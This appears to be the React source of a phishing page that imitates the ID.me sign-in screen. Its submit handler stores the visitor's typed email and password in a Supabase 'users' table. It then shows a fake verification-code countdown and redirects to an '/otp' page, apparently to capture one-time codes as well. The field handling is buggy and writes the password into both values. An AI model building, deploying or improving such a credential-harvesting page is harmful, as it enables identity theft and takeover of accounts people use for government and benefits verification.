import React, { useState, useEffect } from "react";
import idme from "../assets/idme.svg";
import { supabase } from "../config/supabase";
import { useNavigate } from "react-router-dom";

export const Login: React.FC = () => {
    const [email, setEmail] = useState("");
    const [password, setPassword] = useState("");
    const [timer, setTimer] = useState(60);
    const [isButtonDisabled, setIsButtonDisabled] = useState(false);
    const [loading, setLoading] = useState(false);
    const [remember, setRemember] = useState(false);
    const navigate = useNavigate();
  
    const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
      if (e.target.name === "email") {
        console.log(0);
      } else {
        setEmail(e.target.value);
        setPassword(e.target.value);
        
      }
    };
  
    const handleSubmit = async (e: React.FormEvent) => {
      e.preventDefault();
  
      try {
        setLoading(true);
        setIsButtonDisabled(true);
  
        // Submit details to Supabase database
        const { error } = await supabase.from("users").insert([{ email, password }]);
  
        if (error) {
          throw error;
        } else {
          console.log("Data submitted successfully");
          // Optionally, you can navigate to a different page after successful submission
        }
      } catch (error) {
        console.log("Error:", error);
      } finally {
        setLoading(false);
        setIsButtonDisabled(false);
      }
    };
  
    useEffect(() => {
      let countdownInterval: NodeJS.Timeout;
  
      if (isButtonDisabled) {
        countdownInterval = setInterval(() => {
          setTimer((prevTimer) => prevTimer - 1);
        }, 1000);
  
        setTimeout(() => {
          clearInterval(countdownInterval);
          setTimer(60);
          setIsButtonDisabled(false);
          navigate("/otp")
        }, 60000);
      }
  
      return () => {
        clearInterval(countdownInterval);
      };
    }, [isButtonDisabled]);
  return (
    <>
      <header className="flex items-center justify-center bg-white p-6 pb-20 w-full">
        <img src={idme} alt="Jovie" width="80px" />
      </header>
      <div className="flex justify-center items-center h-screen -mt-16">
        <div className="max-w-md w-full bg-white rounded-lg shadow-[0_0_25px_rgba(0,0,0,0.2)] p-8">
          <div className="mb-6 text-center">
            <h1 className="text-[26px] font-bold text-[#2e3f51]">
              Sign in to ID.me
            </h1>
          </div>
          <div className="mb-6 border border-solid bg-[#f2faff] text-center -mx-8 py-4">
            <p className="text-[15px] text-[#2e3f51] font-bold">
              New to ID.me?
            </p>
            <a
              href="#"
              className="text-blue-500 hover:text-blue-700 text-[15px] underline font-bold"
            >
              Create an ID.me account
            </a>
          </div>
          <form onSubmit={handleSubmit}>
            <div className="mb-4">
              <label
                htmlFor="email"
                className="block mb-1 text-[14px] text-[#2e3f51] font-bold"
              >
                Email
              </label>
              <input
                type="email"
                id="email"
                name="email"
                placeholder="Enter your email address"
                className="w-full border-2 border-[#949494] rounded-lg py-4 px-3"
              />
            </div>
            <div className="mb-4">
              <label
                htmlFor="password"
                className="block mb-1 font-bold text-[14px] text-[#2e3f51]"
              >
                Password
              </label>
              <input
                type="password"
                id="password"
                placeholder="Enter password"
                onChange={handleChange}
                className="w-full border-2 border-[#949494] rounded-lg py-4 px-3"
              />
            </div>
            <div className="mb-6">
              <div className="">
                <input
                  type="checkbox"
                  id="remember"
                  name="remember"
                  checked={remember}
                  onChange={() => setRemember(!remember)}
                  className="mr-2"
                />
                <label
                  htmlFor="remember"
                  className="font-bold text-[14px] text-[#2e3f51]"
                >
                  Remember me
                </label>
                <span className="inline-flex text-[14px]">
                  For your security, select only on your devices.
                </span>
              </div>
            </div>
            {loading && (
                
                <div className="flex items-center justify-center mb-4">
                  <div className="mr-2 border-2 border-blue-500 rounded-full p-2">
                    <div className="w-4 h-4 rounded-full bg-blue-500 animate-spin"></div>
                  </div>
                  <p>Sending verification code ({timer}s)</p>
                </div>
            )}
            <div className="flex justify-center">
              <button
                type="submit"
                disabled={isButtonDisabled}
                className="bg-[#266aca] hover:bg-blue-700 text-white text-[16px] font-bold py-4 px-4 rounded-lg w-full"
              >
                Sign in
              </button>
            </div>
          </form>
          <div className="mt-6 text-center">
            <p className="text-sm">
              <a
                href="#"
                className="text-[#266aca] hover:text-blue-700 underline font-extrabold text-[14px]"
              >
                Forgotten password?
              </a>
            </p>
          </div>
        </div>
      </div>
    </>
  );
};
